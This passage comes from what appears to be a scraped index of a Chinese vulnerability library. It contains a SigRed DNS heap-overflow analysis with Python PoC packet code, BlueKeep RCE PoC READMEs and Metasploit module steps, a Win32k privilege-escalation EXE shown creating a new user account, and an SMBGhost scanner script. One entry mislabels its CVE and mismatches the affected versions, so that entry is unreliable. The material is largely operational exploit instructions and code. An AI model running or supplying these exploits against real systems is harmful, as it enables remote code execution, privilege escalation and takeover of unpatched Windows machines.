<p>TC\uff1a\u8868\u793a\u201c\u53ef\u622a\u65ad\u7684\u201d\u3002\u5982\u679c\u4f7f\u7528UDP\u65f6\uff0c\u5f53\u5e94\u7b54\u62a5\u6587\u8d85\u8fc7512\u5b57\u8282\u65f6\uff0c\u53ea\u8fd4\u56de\u524d512\u4e2a\u5b57\u8282\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0cDNS\u67e5\u8be2\u90fd\u662f\u4f7f\u7528UDP\u67e5\u8be2\uff0cUDP\u63d0\u4f9b\u65e0\u8fde\u63a5\u670d\u52a1\u5668\uff0c\u67e5\u8be2\u901f\u5ea6\u5feb\uff0c\u53ef\u964d\u4f4e\u670d\u52a1\u5668\u7684\u8d1f\u8f7d\u3002\u5f53\u5ba2\u6237\u7aef\u53d1\u9001DNS\u8bf7\u6c42\uff0c\u5e76\u4e14\u8fd4\u56de\u54cd\u5e94\u4e2dTC\u4f4d\u8bbe\u7f6e\u4e3a1\u65f6\uff0c\u5c31\u610f\u5473\u7740\u54cd\u5e94\u7684\u957f\u5ea6\u8d85\u8fc7512\u4e2a\u5b57\u8282\uff0c\u800c\u4ec5\u8fd4\u56de\u524d512\u4e2a\u5b57\u8282\u3002\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5ba2\u6237\u7aef\u901a\u5e38\u91c7\u7528TCP\u91cd\u53d1\u539f\u6765\u7684\u67e5\u8be2\u8bf7\u6c42\uff0c\u5e76\u5141\u8bb8\u8fd4\u56de\u7684\u54cd\u5e94\u62a5\u6587\u8d85\u8fc7512\u4e2a\u5b57\u8282\u3002\u76f4\u767d\u70b9\u8bf4\uff0c\u5c31\u662fUDP\u62a5\u6587\u7684\u6700\u5927\u957f\u5ea6\u4e3a512\u5b57\u8282\uff0c\u800cTCP\u5219\u5141\u8bb8\u62a5\u6587\u957f\u5ea6\u8d85\u8fc7512\u5b57\u8282\u3002\u5f53DNS\u67e5\u8be2\u8d85\u8fc7512\u5b57\u8282\u65f6\uff0c\u534f\u8bae\u7684TC\u6807\u5fd7\u4f4d\u4f1a\u7f6e1\uff0c\u8fd9\u65f6\u5219\u4f7f\u7528TCP\u53d1\u9001\u3002</p> <p>Queries\uff1a\u8868\u793aDNS\u8bf7\u6c42\u7684\u57df\u540d\u548c\u7c7b\u578b\u3002</p> <p>\u6f0f\u6d1e\u70b9\u5728\u4e8edns.exe!SigWireRead\uff0c\u8be5\u51fd\u6570\u7528\u4e8e\u5904\u7406SIG\u7c7b\u578b\u7684\u54cd\u5e94\u5305\uff0cRR_AllocateEx  \u5206\u914d\u5927\u5c0f\u7684\u53c2\u6570\u7531\u5bc4\u5b58\u5668cx\u4f20\u5165\uff0c\u53ea\u670916\u4e2abit\uff0c\u5927\u5c0f\u4e3a0~65535\uff0c\u6240\u4ee5\u53ea\u8981\u6784\u9020size  \u5927\u4e8e65535\uff0c\u9020\u6210\u6ea2\u51fa\uff0c\u5c31\u4f1a\u5206\u914d\u4e00\u4e2a\u6bd4\u5b9e\u9645\u6570\u636e\u91cf\u5c0f\u7684\u5806\u5757\uff0c\u9020\u6210\u5806\u6ea2\u51fa\uff0c\u5c06\u6574\u6570\u6ea2\u51fa\u8f6c\u5316\u6210\u5806\u6ea2\u51fa\u6f0f\u6d1e\u3002</p> <p></p> <p>\u4f2a\u4ee3\u7801\u5982\u4e0b\uff1a</p> <p></p> <p>RR_AlloccateEx\u7528\u4e8e\u5206\u914d\u5806\u5757\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u5206\u914d\u7684\u5927\u5c0f\uff0c\u7531<code>[Name_PacketNameToCountNameEx result] + [0x14] + [The Signature field\u2019s length (rdi\u2013rax)]</code> \u51b3\u5b9a\u3002</p> <p>\u6240\u4ee5\u8981\u89e6\u53d1\u6f0f\u6d1e\uff0c\u6211\u4eec\u9700\u8981\u53d1\u9001\u5927\u4e8e64KB\u7684SIG\u7c7b\u578b\u54cd\u5e94\u5305\u7ed9\u53d7\u5bb3\u8005DNS\u670d\u52a1\u5668\uff0c\u4f46\u662f\u57fa\u4e8eUDP\u4f20\u8f93\u7684DNS\u5305\u9650\u5236\u5927\u5c0f\u4e3a512\u4e2a\u5b57\u8282\uff08\u652f\u6301EDNS0\u7684\u9650\u5236\u5927\u5c0f\u4e3a4096\u4e2a\u5b57\u8282\uff09\uff0c\u4e0d\u8db3\u4ee5\u89e6\u53d1\u6f0f\u6d1e\u3002</p> <p>PoC\u7684\u601d\u8def\u662f\u901a\u8fc7\u8bbe\u7f6eTC\u6807\u5fd7\u4f4d\uff0c\u901a\u77e5\u5ba2\u6237\u7aef\u91c7\u7528TCP\u91cd\u53d1\u539f\u6765\u7684\u67e5\u8be2\u8bf7\u6c42\uff0c\u5e76\u5141\u8bb8\u8fd4\u56de\u7684\u54cd\u5e94\u62a5\u6587\u8d85\u8fc7512\u4e2a\u5b57\u8282\u3002\u5982\u4e0b\uff1a</p> <p></p> <p>\u4f46\u662f\u5229\u7528TCP\u4f20\u8f93\u7684DNS\u5305\u9650\u5236\u5927\u5c0f\u4e3a65535\uff0c\u8fd8\u662f\u4e0d\u8db3\u4ee5\u89e6\u53d1\u6f0f\u6d1e\uff0c\u8fd9\u65f6\u5019\u9700\u8981\u7528\u5230DNS\u57df\u540d\u538b\u7f29\u3002</p> <p>\u5b8c\u6574\u7684\u57df\u540d\u8868\u793a\uff0c\u5982www.google.com\uff0c\u9700\u898116\u4e2a\u5b57\u8282\uff1a</p> 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \\3 w w w \\6 g o o g l e \\3 c o m \\0 <p>\u91c7\u7528[ ]\u7684\u5f62\u5f0f\u5b58\u50a8\u3002\u672c\u4f8b\u4e2d\u5c06\u57df\u540d\u5206\u6210\u4e86\u4e09\u6bb5\uff0c\u5206\u522b\u662fwww\uff0cgoogle\uff0ccom\u3002\u6bcf\u4e00\u6bb5\u5f00\u5934\u90fd\u6709\u4e00\u4e2a\u5b57\u8282\uff0c\u8868\u793a\u540e\u9762\u57df\u540d\u7684\u957f\u5ea6\uff0c\u6700\u540e\u4ee5\\0\u7ed3\u5c3e\u3002\u7531\u4e8e\u89c4\u5b9a\u57df\u540d\u6bb5\u7684\u957f\u5ea6\u4e0d\u80fd\u8d85\u8fc763\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u8868\u793a\u57df\u540d\u6bb5\u957f\u5ea6\u7684\u5b57\u8282\u6700\u9ad8\u4e24\u4f4d\u6ca1\u6709\u7528\u5230\uff0c\u56e0\u6b64\u53e6\u6709\u7528\u9014\u3002</p> <p>\uff081\uff09\u5f53\u6700\u9ad8\u4e24\u4f4d\u4e3a00\u65f6\uff0c\u8868\u793a\u4ee5\u4e0a\u9762\u7684\u5f62\u5f0f\u7684\u4f20\u8f93</p> <p>\uff082\uff09\u5f53\u6700\u9ad8\u4e24\u4f4d\u4e3a11\u65f6\uff0c\u8868\u793a\u5c06\u57df\u540d\u8fdb\u884c\u538b\u7f29\uff0c\u8be5\u5b57\u8282\u53bb\u6389\u6700\u9ad8\u4e24\u4f4d\u540e\u5269\u4e0b\u76846\u4f4d\uff0c\u4ee5\u53ca\u540e\u9762\u76848\u4f4d\u603b\u517114\u4f4d\uff0c\u6307\u5411DNS\u6570\u636e\u62a5\u6587\u4e2d\u7684\u67d0\u4e00\u6bb5\u57df\u540d\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2a\u6307\u9488\u3002\u59820xc00c, \u8868\u793a\u4eceDNS\u6b63\u6587\uff08UDP payload\uff09\u7684\u504f\u79fboffset=0x0c\u5904\u6240\u8868\u793a\u7684\u57df\u540d\u3002</p> <p>\uff083\uff09\u6df7\u5408\u8868\u793a\uff1a\u4ee5www.google.com\u4e3a\u4f8b\uff0c\u5047\u8bbe\u8be5\u57df\u540d\u4f4d\u4e8eDNS\u62a5\u6587\u504f\u79fb0x20\u5904\uff0c\u53ef\u80fd\u7684\u7528\u6cd5\u6709\uff1a</p> <p>a\u30010xc020\uff1a\u8868\u793a\u5b8c\u6574\u57df\u540dwww.google.com</p> <p>b\u30010xc024\uff1a\u4ece\u5b8c\u6574\u57df\u540d\u7684\u7b2c\u4e8c\u6bb5\u5f00\u59cb\uff0c\u6307\u4ee3google.com</p> <p>c\u30010x016dc024\uff1a0x01\u8868\u793a\u540e\u9762\u8ddf\u7684size\u5927\u5c0f1\uff0c0x6d\u8868\u793a\u5b57\u7b26m\uff0c\u6240\u4ee50x016d\u8868\u793a\u5b57\u7b26\u4e32\"m\"\uff0c\u7b2c\u4e8c\u6bb50xc024\u6307\u4ee3google.com\uff0c\u56e0\u6b64\u6574\u6bb5\u8868\u793am.google.com</p> <p>Name_PacketNameToCountNameEx\u51fd\u6570\u4f1a\u6839\u636eSigners Name \u6765\u83b7\u53d6\u57df\u540d\u7684\u5927\u5c0f\u3002\u56e0\u6b640xc00c\uff08\u504f\u79fb\u4eceTransaction ID 0x795a\u5f00\u59cb\u8ba1\u7b97\uff09\u6307\u5411\u6b63\u5e38\u57df\u540d9.ibrokethe.net\uff0c\u5927\u5c0f\u5219\u4e3a0x11\u3002</p> <p>[\u5916\u94fe\u56fe\u7247\u8f6c\u5b58\u5931\u8d25,\u6e90\u7ad9\u53ef\u80fd\u6709\u9632\u76d7\u94fe\u673a\u5236,\u5efa\u8bae\u5c06\u56fe\u7247\u4fdd\u5b58\u4e0b\u6765\u76f4\u63a5\u4e0a\u4f20(img-z2rI7Hdk-1595035305879)(data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)]</p> <p>\u4f46\u901a\u8fc7\u8bbe\u7f6eSigner\u2019s  Name\u4e3a0xc00d\uff0c\u5c06\u57df\u540d\u8d77\u59cb\u4f4d\u7f6e\u6307\u5411\"9\"\uff0c\u6b64\u65f6\u4f1a\u5c06\"9\"\u5f53\u4f5c\uff0c\u5c06\u540e\u9762\u76840x39\u4e2a\u5b57\u8282\u5f53\u4f5c\u57df\u540d\u6bb5\uff0c\u5e76\u4e14\u4e00\u76f4\u89e3\u6790\u4e0b\u53bb\uff0c\u76f4\u81f3\u89e3\u6790\u5230\u2019\\0\u2019\u3002\u5982\u4e0b\u56fe\uff0cName_PacketNameToCountNameEx\u4f1a\u5c06\u56fe\u4e2d\u9009\u4e2d\u7684\u90e8\u5206\u5f53\u6210\u57df\u540d\uff0c\u83b7\u53d6\u5927\u5c0f\u3002\u6b64\u65f6\u5927\u5c0f\u4e3a(0x39+1)+(0xf+1)*5 +1 =0x8b\u3002\uff080x39\u548c0xf\u8868\u793a\u57df\u540d\u6bb5\u5927\u5c0f\uff0c+1\u8868\u793a\".\"\uff0c \u6700\u540e\u4e00\u4e2a+1\u8868\u793a\"\\0\"\uff09\u3002</p> <p>[\u5916\u94fe\u56fe\u7247\u8f6c\u5b58\u5931\u8d25,\u6e90\u7ad9\u53ef\u80fd\u6709\u9632\u76d7\u94fe\u673a\u5236,\u5efa\u8bae\u5c06\u56fe\u7247\u4fdd\u5b58\u4e0b\u6765\u76f4\u63a5\u4e0a\u4f20(img-20X5AEwn-1595035305880)(data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)]</p> <p>windbg\u8c03\u8bd5\u7ed3\u679c\uff1a</p> <p></p> <p>[rsp+0x30h]\u4e3a\u4f20\u5165Name_PacketNameToCountNameEx\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u4fdd\u5b58\u83b7\u53d6\u57df\u540d\u7684\u5927\u5c0f\u3002\u800c\u540e\u9762\u7684(rdi\u2013rax)\u8868\u793a\u6211\u4eec\u586b\u5145\u5230Signature\u7684\u6570\u636e\u5927\u5c0f\uff0crdi\u4e3a\u6570\u636e\u7ed3\u675f\u5730\u5740\uff0crax\u4e3a\u8d77\u59cb\u5730\u5740\uff08\u4eceSigner\u2019s Name\u540e\u5f00\u59cb\u8ba1\u7b97\uff09\u3002</p> <p></p> <p>\u8ba1\u7b97\u5b8c\u5927\u5c0f\u4e3a0xffaa\uff1a</p> <p></p> <p>\u6240\u4ee5\u6700\u540e\u4f20\u5165RR_AllocateEx\u51fd\u6570\u7684\u5927\u5c0f\u4e3a (0x8b+0x14+0xffaa)&amp;0xffff= 0x49</p> <p></p> <p>\u4e4b\u540e\u5c06Signature\u7684\u6570\u636e\u590d\u5236\u5230\u5206\u914d\u7684\u7a7a\u95f4\uff1a</p> <p></p> <p>dns!memcpy \u76ee\u6807\u5730\u5740Dst\u4e3aRR_AllocateEx\u5206\u914d\u5730\u5740+\u57df\u540d\u5927\u5c0f\uff080x8b\uff09+0x4c\u5904\uff0c\u6e90\u5730\u5740Src\u4e3aSignature\u6570\u636e\u8d77\u59cb\u5730\u5740\uff0cSize\u4e3aSignature\u6570\u636e\u5927\u5c0f\uff080xffaa\uff09\u3002\u6700\u7ec8\u9020\u6210\u6ea2\u51fa\uff0c\u4ea7\u751f\u5d29\u6e83\u3002</p> <p></p> <p>PoC\u5efa\u7acbTCP\u8fde\u63a5\u540e\uff0c\u53d1\u9001\u7684\u5305\u6784\u9020\u5982\u4e0b\uff1a</p> <pre><code> # SIG Contents\nsig = \"\\x00\\x01\" # Type covered\nsig += \"\\x05\" # Algorithm - RSA/SHA1\nsig += \"\\x00\" # Labels\nsig += \"\\x00\\x00\\x00\\x20\" # TTL\nsig += \"\\x68\\x76\\xa2\\x1f\" # Signature Expiration\nsig += \"\\x5d\\x2c\\xca\\x1f\" # Signature Inception\nsig += \"\\x9e\\x04\" # Key Tag\nsig += \"\\xc0\\x0d\" # Signers Name - Points to the '9' in 9.domain.\nsig += (\"\\x00\"*(19 - len(domain)) + (\"\\x0f\" + \"\\xff\"*15)*5).ljust(65465 - len(domain_compressed), \"\\x00\") # Signature - Here be overflows!\n        \u2026\u2026\n# Msg Size + Transaction ID + DNS Headers + Answer Headers + Answer (Signature)\nconnection.sendall(struct.pack('&gt;H', len_msg) + data[2:4] + response + hdr + sig)\n12345678910111213\n</code></pre> <p>\u4e0a\u8ff0\u6784\u9020\u7684\u4fe1\u606f\u6293\u5305\u5185\u5bb9\u5982\u4e0b\uff1a</p> <p></p> <p>\u6574\u4e2a\u4ea4\u4e92\u8fc7\u7a0b\u5982\u4e0b\uff08\u53d7\u5bb3\u8005DNS\u670d\u52a1\u5668\u6293\u5305\u7ed3\u679c\uff09\uff1a</p> <p></p> <p></p> <p>192.168.148.134\u4e3a\u53d7\u5bb3\u8005IP\uff0c192.168.148.138\u4e3a\u653b\u51fb\u8005IP\u3002</p> <p>\uff081\uff09\u53d7\u5bb3\u8005\u5411\u653b\u51fb\u8005\u67e5\u8be2 9.ibrokethe.net</p> <p>\uff082\uff09\u653b\u51fb\u8005\u8fd4\u56de\u4e00\u4e2a\u54cd\u5e94\u5305\uff0c\u8bbe\u7f6eTC\u4f4d\uff0c\u901a\u77e5\u5ba2\u6237\u7aef\u91c7\u7528TCP\u91cd\u53d1\u539f\u6765\u7684\u67e5\u8be2\u8bf7\u6c42\uff0c\u5e76\u5141\u8bb8\u8fd4\u56de\u7684\u54cd\u5e94\u62a5\u6587\u8d85\u8fc7512\u4e2a\u5b57\u8282</p> <p>\uff083\uff09\u53d7\u5bb3\u8005\u5c31\u548c\u653b\u51fb\u8005\u5efa\u7acbTCP\u8fde\u63a5</p> <p>\uff084\uff09\u53d7\u5bb3\u8005\u91cd\u65b0\u5411\u653b\u51fb\u8005\u67e5\u8be2 9.ibrokethe.net</p> <p>\uff085\uff09\u653b\u51fb\u8005\u5229\u7528TCP\u4f20\u8f93\u5927\u4e8e64KB\u7684\u54cd\u5e94\u5305\u7ed9\u53d7\u5bb3\u8005\uff0c\u89e6\u53d1\u6f0f\u6d1e\uff0c\u9020\u6210\u6ea2\u51fa</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/BlueKeep/","title":"Bluekeep PoC","text":"<p>This repo contains research concerning CVE-2019-0708.  </p> <p>Bluekeep or CVE-2019-0708 is an RCE exploit that effects the following versions of Windows systems:</p> <ul> <li>Windows 2003</li> <li>Windows XP</li> <li>Windows Vista</li> <li>Windows 7</li> <li>Windows Server 2008</li> <li>Windows Server 2008 R2</li> </ul> <p>The vulnerability occurs during pre-authorization and has the potential to run arbitrary malicious code in the NT Authority\\system  user security context.</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/BlueKeep/#how-it-works","title":"How it works","text":"<p>By sending a specially crafted packet an attacker is able to set the value for the Channel ID to something the RDP service isn't expecting, this causes a memory corruption bug that will create the conditions for Remote Code Execution to occur. Should the attacker choose to follow up with packets designed to take advantage of this flaw remote code execution can be achieved with System user privileges.</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/BlueKeep/#setup","title":"Setup","text":"<pre><code>git clone https://github.com/ekultek/bluekeep \ncd bluekeep\nbash setup.sh\n</code></pre> <p>That should do what you need done and fix any issue you have.</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/BlueKeep/#credits","title":"Credits","text":"<p>Research by Ekultek and (VectorSEC)/NullArray</p> <p>Development &amp; Testing by Ekultek</p> <p>Follow us on Twitter</p> <ul> <li>Ekultek</li> <li>VectorSEC</li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/BlueKeep/#in-closing","title":"In Closing","text":"<p>You can see some of our research, along with a list of potentially vulnerable targets under the research directory. We started with very little and decided that we weren't going to stop until we had a working exploit. I have been able to execute commands on Windows XP with this PoC personally.</p> <p>Note</p> <p>There are no payloads. This is just a PoC. HOWEVER it is easily ported to an exploit since you can easily add payloads to this.</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/BlueKeep/CVE-2019-0708-msf%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA/","title":"CVE 2019 0708 msf\u5feb\u901f\u642d\u5efa","text":"<pre><code>sudo apt-get install libsqlite3-dev libpq-dev libpcap-dev -y\ngit clone https://github.com/rapid7/metasploit-framework.git\ncd metasploit-framework\ngit fetch origin pull/12283/head:bluekeep\ngit checkout bluekeep\ngem install bundler &amp;&amp; bundle\n./msfconsole\nmsf5 &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\n</code></pre> <p>\u5982\u679c\u51fa\u73b0\u5982\u4e0b\u9519\u8bef: <pre><code>/usr/local/bundle/bin/bundle:104:in `load': cannot load such file -- /usr/local/lib/ruby/gems/2.4.0/gems/bundler-1.16.1/exe/bundle (LoadError)\n\n    from /usr/local/bundle/bin/bundle:104:in `&lt;main&gt;'\n</code></pre> \u53ef\u4ee5\u5c1d\u8bd5\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u4fee\u590d: <pre><code>gem update --system\ngem pristine bundler\n</code></pre></p> <p>\u4ec5\u5728Debian\u6d4b\u8bd5\u8fc7</p> <p>\u53c2\u8003: https://pentest-tools.com/blog/bluekeep-exploit-metasploit/ </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/BlueKeep/bluekeep-CVE-2019-0708-python/","title":"bluekeep","text":"<p>Public work for CVE-2019-0708</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/BlueKeep/bluekeep-CVE-2019-0708-python/#2019-11-17-update","title":"2019-11-17 Update","text":"<p>Added Windows 7 32bit exploit POC code. </p> <p>Using the address within the POC exploit code I had ~80% success rate against my test VM. It could likely be modfied to increase.</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/BlueKeep/bluekeep-CVE-2019-0708-python/#usage","title":"Usage","text":"<p>Replace the buf variable with your shellcode. Update the host variable to your target.</p> <p><code>python3 win7_32_poc.py</code></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/BlueKeep/bluekeep-CVE-2019-0708-python/#requirements","title":"Requirements","text":"<ul> <li>Python3</li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/BlueKeep/bluekeep-CVE-2019-0708-python/#legal-disclaimer","title":"Legal Disclaimer","text":"<p>This project is made for educational and ethical testing purposes only. Usage of for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.</p> <p>author: https://github.com/0xeb-bp/bluekeep</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2019-0708/readme/","title":"\u6f0f\u6d1e\u7f16\u53f7","text":"<p>CVE-2020-07961</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2019-0708/readme/#_2","title":"\u5f71\u54cd\u7248\u672c","text":"<p>\u9002\u7528\u4e8e32\u4f4d\u7cfb\u7edf\u7684Windows 10\u7248\u672c1903</p> <p>Windows 10 1903\u7248\uff08\u7528\u4e8e\u57fa\u4e8ex64\u7684\u7cfb\u7edf\uff09</p> <p>Windows 10 1903\u7248\uff08\u7528\u4e8e\u57fa\u4e8eARM64\u7684\u7cfb\u7edf\uff09</p> <p>Windows Server 1903\u7248\uff08\u670d\u52a1\u5668\u6838\u5fc3\u5b89\u88c5\uff09</p> <p>\u9002\u7528\u4e8e32\u4f4d\u7cfb\u7edf\u7684Windows 10\u7248\u672c1909</p> <p>Windows 10\u7248\u672c1909\uff08\u7528\u4e8e\u57fa\u4e8ex64\u7684\u7cfb\u7edf\uff09</p> <p>Windows 10 1909\u7248\uff08\u7528\u4e8e\u57fa\u4e8eARM64\u7684\u7cfb\u7edf\uff09</p> <p>Windows Server\u7248\u672c1909\uff08\u670d\u52a1\u5668\u6838\u5fc3\u5b89\u88c5\uff09</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2019-0708/readme/#_3","title":"\u5229\u7528","text":"<p>python scanner.py ip</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2019-0803/CVE-2019-0803-Win32k%20Elevation%20of%20Privilege%20Poc/","title":"CVE 2019 0803 Win32k Elevation of Privilege Poc","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2019-0803/CVE-2019-0803-Win32k%20Elevation%20of%20Privilege%20Poc/#cve-2019-0803-win32k-elevation-of-privilege-poc","title":"CVE-2019-0803-Win32k Elevation of Privilege Poc","text":"<p>CVE-2019-0803.exe Win32k\u6f0f\u6d1e\u63d0\u6743\u5de5\u5177  \u6ca1\u6709\u7f16\u8bd1\u7684\uff0c\u6765\u81ea\uff1a<code>https://github.com/ExpLife0011/CVE-2019-0803</code> </p> <p> </p> <p>\u53e6\u5916\u4e00\u4e2a\u662fK8\u5199\u7684\u6210\u54c1EXE\uff0c\u63d0\u793a:\u81ea\u884c\u659f\u914c\u4f7f\u7528\u4efb\u4f55\u63d0\u6743EXE\uff1a  </p> <p><code>https://github.com/k8gege/K8tools/raw/master/CVE-2019-0803.exe</code></p> <p>\u4f7f\u7528\u65b9\u6cd5\uff1a<code>CVE-2019-0803.exe cmd \"net user test test@321# /add\"</code></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2019-0803/CVE-2019-0803/","title":"CVE-2019-0803","text":"<p>Win32k Elevation of Privilege Poc</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2019-0803/CVE-2019-0803/#screenshot","title":"Screenshot","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2019-0803/CVE-2019-0803/#reference","title":"Reference","text":"<p>(steal Security token) https://github.com/mwrlabs/CVE-2016-7255</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2020-0796/CVE-2020-0796%E6%A3%80%E6%B5%8B%E4%B8%8E%E4%BF%AE%E5%A4%8D/","title":"CVE 2020 0796\u68c0\u6d4b\u4e0e\u4fee\u590d","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/05-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/Windows/CVE-2020-0796/CVE-2020-0796%E6%A3%80%E6%B5%8B%E4%B8%8E%E4%BF%AE%E5%A4%8D/#cve-20200796","title":"CVE-2020\u20130796\u68c0\u6d4b\u4e0e\u4fee\u590d","text":"<p>\u6f0f\u6d1e\u5f71\u54cd\u7248\u672c\uff1a</p> <p>Windows 10\u7248\u672c1903\uff08\u7528\u4e8e32\u4f4d\u7cfb\u7edf\uff09 Windows 10\u7248\u672c1903\uff08\u7528\u4e8e\u57fa\u4e8eARM64\u7684\u7cfb\u7edf\uff09 Windows 10\u7248\u672c1903\uff08\u7528\u4e8e\u57fa\u4e8ex64\u7684\u7cfb\u7edf\uff09 Windows 10\u7248\u672c1909\uff08\u7528\u4e8e32\u4f4d\u7cfb\u7edf\uff09 Windows 10\u7248\u672c1909\uff08\u7528\u4e8e\u57fa\u4e8eARM64\u7684\u7cfb\u7edf\uff09 Windows 10\u7248\u672c1909\uff08\u7528\u4e8e\uff09\u57fa\u4e8ex64\u7684\u7cfb\u7edf Windows Server 1903\u7248\uff08\u670d\u52a1\u5668\u6838\u5fc3\u5b89\u88c5\uff09 Windows Server 1909\u7248\uff08\u670d\u52a1\u5668\u6838\u5fc3\u5b89\u88c5\uff09</p> <p>\u6f0f\u6d1e\u68c0\u6d4b\u5de5\u5177</p> <p>python\u7248\u672c</p> <p>\u6765\u6e90\uff1ahttps://github.com/ollypwn/SMBGhost/blob/master/scanner.py</p> <pre><code>import socket\nimport struct\nimport sys\n\npkt = b'\\x00\\x00\\x00\\xc0\\xfeSMB@\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00$\\x00\\x08\\x00\\x01\\x00\\x00\\x00\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00x\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x02\\x10\\x02\"\\x02$\\x02\\x00\\x03\\x02\\x03\\x10\\x03\\x11\\x03\\x00\\x00\\x00\\x00\\x01\\x00&amp;\\x00\\x00\\x00\\x00\\x00\\x01\\x00 \\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\n\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\nsock = socket.socket(socket.AF_INET)\nsock.settimeout(3)\nsock.connect(( sys.argv[1],  445 ))\nsock.send(pkt)\n\nnb, = struct.unpack(\"&gt;I\", sock.recv(4))\nres = sock.recv(nb)\n\nif not res[68:70] == b\"\\x11\\x03\":\n    exit(\"Not vulnerable.\")\nif not res[70:72] == b\"\\x02\\x00\":\n    exit(\"Not vulnerable.\")\n\nexit(\"Vulnerable.\")\n</code></pre> <p>nmap\u7248\u672c\uff1a</p> <pre><code>#!/bin/bash\nif [ $# -eq 0 ]\n  then\n    echo $'Usage:\\n\\tcheck-smb-v3.11.sh TARGET_IP_or_CIDR {Target Specification - Nmap}'\n    exit 1\nfi\n\necho \"Checking if there's SMB v3.11 in\" $1 \"...\"\n\nnmap -p445 --script smb-protocols -Pn -n $1 | grep -P '\\d+\\.\\d+\\.\\d+\\.\\d+|^\\|.\\s+3.11' | tr '\\n' ' 